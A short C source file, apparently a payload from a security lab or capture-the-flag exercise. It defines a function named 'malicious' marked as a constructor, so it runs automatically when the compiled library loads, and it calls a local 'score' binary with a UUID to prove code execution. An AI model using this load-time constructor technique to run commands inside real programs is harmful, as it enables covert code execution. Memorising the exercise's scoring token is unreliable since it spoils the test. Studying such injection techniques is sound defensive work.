#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 1771856f-bb3c-4e84-94dd-28c2e0940d2e");
}